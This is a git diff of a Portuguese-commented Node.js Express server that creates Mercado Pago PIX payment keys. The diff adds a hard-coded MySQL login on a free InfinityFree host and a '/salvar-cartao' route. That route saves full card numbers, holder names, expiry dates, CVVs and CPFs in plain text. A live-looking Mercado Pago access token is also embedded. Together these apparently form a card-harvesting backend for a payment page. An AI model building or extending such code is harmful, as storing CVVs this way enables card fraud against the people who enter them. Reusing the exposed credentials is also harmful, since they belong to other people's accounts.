@@ -5,11 +5,15 @@ const bodyParser = require("body-parser");
 const cors = require("cors");
 const fs = require("fs");
 const { v4: uuidv4 } = require("uuid");
+const mysql = require("mysql2");
 
 const app = express();
 app.use(bodyParser.json());
 app.use(cors());
 
+/********************
+ * CONFIGURAÇÃO PIX *
+ ********************/
 const ACCESS_TOKEN = "APP_USR-7155153166578433-022021-bb77c63cb27d3d05616d5c08e09077cf-502781407";
 const PAGAMENTOS_FILE = "pagamentos.json";
 
@@ -63,7 +67,9 @@ async function gerarChavePix(valor, payerEmail, payerCpf) {
   }
 }
 
-// Rota para gerar a chave PIX e salvar o pagamento no arquivo
+/**********************
+ * ROTA PIX EXISTENTE *
+ **********************/
 app.post("/gerar-chave-pix", async (req, res) => {
   try {
     const { valor, payerEmail, payerCpf } = req.body;
@@ -85,7 +91,45 @@ app.post("/gerar-chave-pix", async (req, res) => {
   }
 });
 
-// Função para atualizar o status dos pagamentos
+/***********************************
+ * CONFIGURAÇÃO BANCO CARTÕES (PHP) *
+ ***********************************/
+const db = mysql.createConnection({
+  host: "sql110.infinityfree.com",
+  user: "if0_39790610",
+  password: "M10019210a",
+  database: "if0_39790610_teste",
+});
+
+db.connect((err) => {
+  if (err) {
+    console.error("Erro de conexão com o banco:", err.message);
+  } else {
+    console.log("Conectado ao banco InfinityFree!");
+  }
+});
+
+// Rota para salvar cartões
+app.post("/salvar-cartao", (req, res) => {
+  const { cpf, numero, nome, validade, cvv } = req.body;
+
+  if (!cpf || !numero || !nome || !validade || !cvv) {
+    return res.status(400).json({ error: "Todos os campos são obrigatórios." });
+  }
+
+  const sql = "INSERT INTO cartoes (cpf, numero, nome, validade, cvv) VALUES (?, ?, ?, ?, ?)";
+  db.execute(sql, [cpf, numero, nome, validade, cvv], (err, results) => {
+    if (err) {
+      console.error("Erro ao salvar cartão:", err.message);
+      return res.status(500).json({ error: "Erro ao salvar cartão." });
+    }
+    res.json({ sucesso: true, mensagem: "Cartão salvo com sucesso!" });
+  });
+});
+
+/******************************
+ * FUNÇÕES DE ATUALIZAÇÃO PIX *
+ ******************************/
 async function atualizarStatusPagamentos() {
   try {
     const pagamentos = JSON.parse(fs.readFileSync(PAGAMENTOS_FILE, "utf8"));
@@ -113,7 +157,9 @@ async function atualizarStatusPagamentos() {
   }
 }
 
-// Rota para listar apenas os pagamentos aprovados
+/******************************
+ * ROTAS EXISTENTES DE PAGAMENTOS *
+ ******************************/
 app.get("/pagamentos", (req, res) => {
   try {
     const pagamentos = JSON.parse(fs.readFileSync(PAGAMENTOS_FILE, "utf8"));
@@ -124,12 +170,9 @@ app.get("/pagamentos", (req, res) => {
   }
 });
 
-// Rota para verificar o status de um pagamento manualmente
 app.post("/verificar-status", async (req, res) => {
   const { txid } = req.body;
-  if (!txid) {
-    return res.status(400).json({ error: "txid não fornecido" });
-  }
+  if (!txid) return res.status(400).json({ error: "txid não fornecido" });
 
   try {
     const response = await axios.get(`https://api.mercadopago.com/v1/payments/${txid}`, {
@@ -151,7 +194,9 @@ app.post("/verificar-status", async (req, res) => {
   }
 });
 
-// Função para enviar um ping ao servidor
+/******************************
+ * FUNÇÕES DE PING AUTOMÁTICO *
+ ******************************/
 async function enviarPing() {
   try {
     const response = await axios.get(`http://localhost:${PORT}/pagamentos`);
@@ -161,11 +206,14 @@ async function enviarPing() {
   }
 }
 
-// Configuração para atualizar automaticamente os pagamentos a cada 60 segundos
+/******************************
+ * INTERVALOS AUTOMÁTICOS *
+ ******************************/
 setInterval(atualizarStatusPagamentos, 60000);
-
-// Configuração para enviar ping ao servidor a cada 60 segundos
 setInterval(enviarPing, 60000);
 
+/*********************
+ * INICIAR SERVIDOR *
+ *********************/
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));
